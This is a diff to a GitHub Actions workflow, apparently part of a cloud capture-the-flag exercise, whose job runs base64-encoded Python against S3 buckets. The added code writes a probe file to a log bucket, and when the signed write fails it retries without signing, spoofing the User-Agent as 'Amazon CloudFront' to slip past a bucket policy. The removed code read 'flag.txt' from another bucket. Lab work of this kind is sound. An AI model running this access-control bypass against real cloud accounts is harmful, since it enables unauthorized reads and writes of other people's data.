@@ -1,4 +1,4 @@
-name: Stage2-CodeExec-Signed-UA
+name: Stage2-CodeExec-Log-Write
 
 on:
   push:
@@ -20,7 +20,7 @@ jobs:
       AWS_DEFAULT_REGION: us-east-1
 
     steps:
-      - name: Test signed S3 request with custom User-Agent
+      - name: Test log bucket write path
         shell: bash
         run: |
           set +e
@@ -39,8 +39,15 @@ jobs:
 
           inner = r'''
           import time
+          import urllib.request
           import boto3
           from botocore.config import Config
+
+          bucket = "logad88e2b168aa387e"
+          key = "stage2-write-probe.txt"
+          body = b"stage2-probe"
+
+          success = False
 
           try:
               client = boto3.client(
@@ -53,20 +60,49 @@ jobs:
                   )
               )
 
-              result = client.get_object(
-                  Bucket="userad88e2b168aa387e",
-                  Key="flag.txt"
+              client.put_object(
+                  Bucket=bucket,
+                  Key=key,
+                  Body=body
               )
 
-              data = result["Body"].read()
-
-              print("SIGNED_CUSTOM_UA_SUCCESS")
-              print("BYTES=" + str(len(data)))
-              time.sleep(5)
+              print("SIGNED_PUT_SUCCESS")
+              success = True
 
           except Exception as error:
-              print("SIGNED_CUSTOM_UA_FAILURE")
+              print("SIGNED_PUT_FAILURE")
               print(repr(error))
+
+          if not success:
+              try:
+                  url = (
+                      "https://s3.us-east-1.amazonaws.com/"
+                      + bucket
+                      + "/"
+                      + key
+                  )
+
+                  request = urllib.request.Request(
+                      url,
+                      data=body,
+                      headers={
+                          "User-Agent": "Amazon CloudFront",
+                          "Content-Type": "text/plain"
+                      },
+                      method="PUT"
+                  )
+
+                  with urllib.request.urlopen(request, timeout=10) as response:
+                      print("UNSIGNED_PUT_STATUS=" + str(response.status))
+
+                  success = True
+
+              except Exception as error:
+                  print("UNSIGNED_PUT_FAILURE")
+                  print(repr(error))
+
+          if success:
+              time.sleep(5)
           '''
 
           encoded_inner = base64.b64encode(inner.encode()).decode()
